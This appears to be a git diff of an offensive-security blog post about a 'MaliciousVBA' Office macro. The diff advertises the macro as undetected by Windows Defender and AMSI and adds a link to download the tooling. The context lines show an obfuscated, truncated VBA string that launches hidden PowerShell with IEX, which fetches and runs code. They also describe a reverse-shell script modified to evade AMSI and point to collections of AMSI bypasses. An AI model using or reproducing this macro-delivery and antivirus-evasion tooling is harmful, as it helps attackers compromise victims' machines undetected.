@@ -6,7 +6,7 @@ categories: []
 tags: []
 ---
 
-# MaliciousVBA
+# MaliciousVBA (Not Detected by Windows Defender or AMSI)
 
 I was reading various articles on how other go about bypassing AMSI using VBA. A great article can be found on this blog [codewhitesec](https://codewhitesec.blogspot.com/2019/07/heap-based-amsi-bypass-in-vba.html).
 
@@ -31,3 +31,6 @@ Chr(112) + "ower" + "shell.exe " + Chr(150) + "WindowStyle Hidden" + "  IEX (New
 ```
 ## Powershell script (Invoke-PowerShellTcp)
 I have slightly modified [Nikhil's](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script in order to avoid being detected by AMSI for powershell. Once connection is established an amsi bypass script can be used.[Here is a list of AMSI bypass scripts that can be used by S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+
+## Download the files
+You can download the files from my [Github Repo](https://github.com/scriptchildie/MaliciousVBA). 
